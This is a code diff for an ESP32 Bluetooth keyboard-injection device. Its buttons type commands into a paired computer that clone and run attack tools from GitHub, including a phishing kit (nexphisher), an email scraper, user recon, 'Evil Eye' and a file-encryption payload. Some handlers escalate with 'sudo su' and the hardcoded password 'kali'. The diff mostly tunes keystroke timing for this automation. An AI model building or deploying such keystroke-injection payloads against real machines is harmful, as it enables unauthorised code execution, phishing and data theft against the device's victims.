@@ -325,80 +325,70 @@ void loop() {
       sendString("kali", 10); delay(1000); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
       bleKeyboard.releaseAll(); delay(1000);
-      sendString("git clone https://github.com/sachinpandey7709/File-Encryption-Awareness-Project-Ethical-Demo-.git", 10); delay(4000); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
+      sendString("git clone https://github.com/sachinpandey7709/File-Encryption-Awareness-Project-Ethical-Demo-.git", 50); delay(4000); 
+      bleKeyboard.press(KEY_RETURN); delay(1000); 
       bleKeyboard.releaseAll(); delay(7000);
-      sendString("cd File-Encryption-Awareness-Project-Ethical-Demo-", 10); delay(4000); 
+      sendString("cd File-Encryption-Awareness-Project-Ethical-Demo-", 50); delay(4000); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
       bleKeyboard.releaseAll(); delay(1000);
-      sendString("python3 code.py", 130); delay(3000);
-      bleKeyboard.press(KEY_RETURN); delay(100);
+      sendString("python3 code.py", 50); delay(3000);
+      bleKeyboard.press(KEY_RETURN); delay(1000);
       bleKeyboard.releaseAll(); delay(1000);
       Serial.println("File Encryption Payload executed");
     }
 
-    // Button 12: Email Scraper (Pin 33)
+     // Button 12: Email Scraper (Pin 33)
     if (lastState12 == HIGH && state12 == LOW) {
       Serial.println("Button 12: Email Scraper (Pin 33)");
       bleKeyboard.press(KEY_LEFT_CTRL); 
       bleKeyboard.press(KEY_LEFT_ALT); 
       bleKeyboard.press('t'); 
-      delay(100); 
-      bleKeyboard.releaseAll(); delay(5000);
-      sendString("cd Desktop", 10); delay(2000); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(1000);
-      sendString("sudo su", 10); delay(1000); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(1000);
-      sendString("kali", 10); delay(1000); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(1000);
-      sendString("git clone https://github.com/codewithharit/Email-Scraper.git", 10); delay(2000); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(7000);
-      sendString("cd Email-Scraper", 10); delay(100); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(1000);
-      sendString("chmod +x *", 130); delay(3000);
-      bleKeyboard.press(KEY_RETURN); delay(100);
-      bleKeyboard.releaseAll(); delay(1000);
-      sendString("bash emailscraper.sh", 130); delay(3000);
-      bleKeyboard.press(KEY_RETURN); delay(100);
-      bleKeyboard.releaseAll(); delay(1000);
-      Serial.println("Email Scraper Payload executed");
+      delay(3000); 
+      bleKeyboard.releaseAll(); delay(3000); // Increased for terminal to open
+      Serial.println("Terminal opened");
+      sendString("git clone https://github.com/codewithharit/Email-Scraper.git", 50); delay(1000); // 50ms per char, 1000ms before RETURN
+      bleKeyboard.press(KEY_RETURN); delay(500); 
+      bleKeyboard.releaseAll(); delay(15000); // Increased for git clone
+      Serial.println("Git clone completed");
+      sendString("cd Email-Scraper", 50); delay(1000); // 50ms per char, 1000ms before RETURN
+      bleKeyboard.press(KEY_RETURN); delay(500); 
+      bleKeyboard.releaseAll(); delay(1000); // Kept for quick cd
+      Serial.println("Changed to Email-Scraper directory");
+      sendString("chmod +x *", 50); delay(1000); // 50ms per char, 1000ms before RETURN
+      bleKeyboard.press(KEY_RETURN); delay(500); 
+      bleKeyboard.releaseAll(); delay(1000); // Quick chmod
+      Serial.println("Set executable permissions");
+      sendString("bash emailscraper.sh", 50); delay(1000); // 50ms per char, 1000ms before RETURN
+      bleKeyboard.press(KEY_RETURN); delay(500);
+      bleKeyboard.releaseAll(); delay(10000); // Increased for script startup
+      Serial.println("Email-Scraper Payload executed");
     }
 
-    // Button 13: Evil Eye (Pin 14)
+     // Button 13: Evil Eye (Pin 14)
     if (lastState13 == HIGH && state13 == LOW) {
       Serial.println("Button 13: Evil Eye (Pin 14)");
       bleKeyboard.press(KEY_LEFT_CTRL); 
       bleKeyboard.press(KEY_LEFT_ALT); 
       bleKeyboard.press('t'); 
-      delay(100); 
-      bleKeyboard.releaseAll(); delay(5000);
-      sendString("cd Desktop", 10); delay(2000); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(1000);
-      sendString("sudo su", 10); delay(1000); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(1000);
-      sendString("kali", 10); delay(1000); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(1000);
-      sendString("git clone https://github.com/codewithharit/Evil-Eye.git", 10); delay(2000); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(7000);
-      sendString("cd Evil-Eye", 10); delay(100); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(1000);
-      sendString("chmod +x *", 130); delay(3000);
-      bleKeyboard.press(KEY_RETURN); delay(100);
-      bleKeyboard.releaseAll(); delay(1000);
-      sendString("bash linux.sh", 130); delay(3000);
-      bleKeyboard.press(KEY_RETURN); delay(100);
-      bleKeyboard.releaseAll(); delay(1000);
-      Serial.println("Evil Eye Payload executed");
+      delay(3000); 
+      bleKeyboard.releaseAll(); delay(3000); // Increased for terminal to open
+      Serial.println("Terminal opened");
+      sendString("git clone https://github.com/codewithharit/Evil-Eye.git", 50); delay(1000); // 50ms per char, 1000ms before RETURN
+      bleKeyboard.press(KEY_RETURN); delay(500); 
+      bleKeyboard.releaseAll(); delay(15000); // Increased for git clone
+      Serial.println("Git clone completed");
+      sendString("cd Evil-Eye", 50); delay(1000); // 50ms per char, 1000ms before RETURN
+      bleKeyboard.press(KEY_RETURN); delay(500); 
+      bleKeyboard.releaseAll(); delay(1000); // Kept for quick cd
+      Serial.println("Changed to Evil-Eye directory");
+      sendString("chmod +x *", 50); delay(1000); // 50ms per char, 1000ms before RETURN
+      bleKeyboard.press(KEY_RETURN); delay(500); 
+      bleKeyboard.releaseAll(); delay(1000); // Quick chmod
+      Serial.println("Set executable permissions");
+      sendString("bash linux.sh", 50); delay(1000); // 50ms per char, 1000ms before RETURN
+      bleKeyboard.press(KEY_RETURN); delay(500);
+      bleKeyboard.releaseAll(); delay(10000); // Increased for script startup
+      Serial.println("Evil-Eye Payload executed");
     }
 
     // Button 14: Userrecon (Pin 15)
@@ -407,66 +397,57 @@ void loop() {
       bleKeyboard.press(KEY_LEFT_CTRL); 
       bleKeyboard.press(KEY_LEFT_ALT); 
       bleKeyboard.press('t'); 
-      delay(100); 
-      bleKeyboard.releaseAll(); delay(5000);
-      sendString("cd Desktop", 10); delay(2000); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(1000);
-      sendString("sudo su", 10); delay(1000); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(1000);
-      sendString("kali", 10); delay(1000); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(1000);
-      sendString("git clone https://github.com/wishihab/userrecon.git", 10); delay(2000); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(7000);
-      sendString("cd userrecon", 10); delay(100); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(1000);
-      sendString("chmod +x *", 130); delay(3000);
-      bleKeyboard.press(KEY_RETURN); delay(100);
-      bleKeyboard.releaseAll(); delay(1000);
-      sendString("bash userrecon.sh", 130); delay(3000);
-      bleKeyboard.press(KEY_RETURN); delay(100);
-      bleKeyboard.releaseAll(); delay(1000);
+      delay(3000); 
+      bleKeyboard.releaseAll(); delay(3000); // Increased for terminal to open
+      Serial.println("Terminal opened");
+      sendString("git clone https://github.com/wishihab/userrecon.git", 50); delay(1000); // 50ms per char, 1000ms before RETURN
+      bleKeyboard.press(KEY_RETURN); delay(500); 
+      bleKeyboard.releaseAll(); delay(15000); // Increased for git clone
+      Serial.println("Git clone completed");
+      sendString("cd userrecon", 50); delay(1000); // 50ms per char, 1000ms before RETURN
+      bleKeyboard.press(KEY_RETURN); delay(500); 
+      bleKeyboard.releaseAll(); delay(1000); // Kept for quick cd
+      Serial.println("Changed to Userrecon directory");
+      sendString("chmod +x *", 50); delay(1000); // 50ms per char, 1000ms before RETURN
+      bleKeyboard.press(KEY_RETURN); delay(500); 
+      bleKeyboard.releaseAll(); delay(1000); // Quick chmod
+      Serial.println("Set executable permissions");
+      sendString("bash userrecon.sh", 50); delay(1000); // 50ms per char, 1000ms before RETURN
+      bleKeyboard.press(KEY_RETURN); delay(500);
+      bleKeyboard.releaseAll(); delay(10000); // Increased for script startup
       Serial.println("Userrecon Payload executed");
     }
 
-    // Button 15: Nexphisher (Pin 13)
+   // Button 15: Nexphisher (Pin 13)
     if (lastState15 == HIGH && state15 == LOW) {
       Serial.println("Button 15: Nexphisher (Pin 13)");
       bleKeyboard.press(KEY_LEFT_CTRL); 
       bleKeyboard.press(KEY_LEFT_ALT); 
       bleKeyboard.press('t'); 
-      delay(100); 
-      bleKeyboard.releaseAll(); delay(5000);
-      sendString("cd Desktop", 10); delay(2000); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(1000);
-      sendString("sudo su", 10); delay(1000); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(1000);
-      sendString("kali", 10); delay(1000); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(1000);
-      sendString("git clone https://github.com/htr-tech/nexphisher.git", 10); delay(2000); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(7000);
-      sendString("cd nexphisher", 10); delay(100); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(1000);
-      sendString("chmod +x *", 130); delay(3000);
-      bleKeyboard.press(KEY_RETURN); delay(100);
-      bleKeyboard.releaseAll(); delay(1000);
-      sendString("./setup", 130); delay(3000);
-      bleKeyboard.press(KEY_RETURN); delay(100);
-      bleKeyboard.releaseAll(); delay(40000);
-      sendString("./nexphisher", 130); delay(3000);
-      bleKeyboard.press(KEY_RETURN); delay(100);
-      bleKeyboard.releaseAll(); delay(1000);
+      delay(3000); 
+      bleKeyboard.releaseAll(); delay(3000); // Increased for terminal to open
+      Serial.println("Terminal opened");
+      sendString("git clone https://github.com/htr-tech/nexphisher.git", 50); delay(1000); // 50ms per char, 1000ms before RETURN
+      bleKeyboard.press(KEY_RETURN); delay(500); 
+      bleKeyboard.releaseAll(); delay(15000); // Increased for git clone
+      Serial.println("Git clone completed");
+      sendString("cd nexphisher", 50); delay(1000); // 50ms per char, 1000ms before RETURN
+      bleKeyboard.press(KEY_RETURN); delay(500); 
+      bleKeyboard.releaseAll(); delay(1000); // Kept for quick cd
+      Serial.println("Changed to Nexphisher directory");
+      sendString("chmod +x *", 50); delay(1000); // 50ms per char, 1000ms before RETURN
+      bleKeyboard.press(KEY_RETURN); delay(500); 
+      bleKeyboard.releaseAll(); delay(1000); // Quick chmod
+      Serial.println("Set executable permissions");
+      sendString("./setup", 50); delay(3000); // 50ms per char, 1000ms before RETURN
+      bleKeyboard.press(KEY_RETURN); delay(500);
+      bleKeyboard.releaseAll(); delay(40000); // Increased for script startup
+      sendString("./nexphisher", 50); delay(3000); // 50ms per char, 1000ms before RETURN
+      bleKeyboard.press(KEY_RETURN); delay(500);
+      bleKeyboard.releaseAll(); delay(3000);
       Serial.println("Nexphisher Payload executed");
     }
+
 
     lastState1 = state1;
     lastState2 = state2;
@@ -488,6 +469,7 @@ void loop() {
   }
   delay(50); // Debounce/stability
 }
+
 
 
 
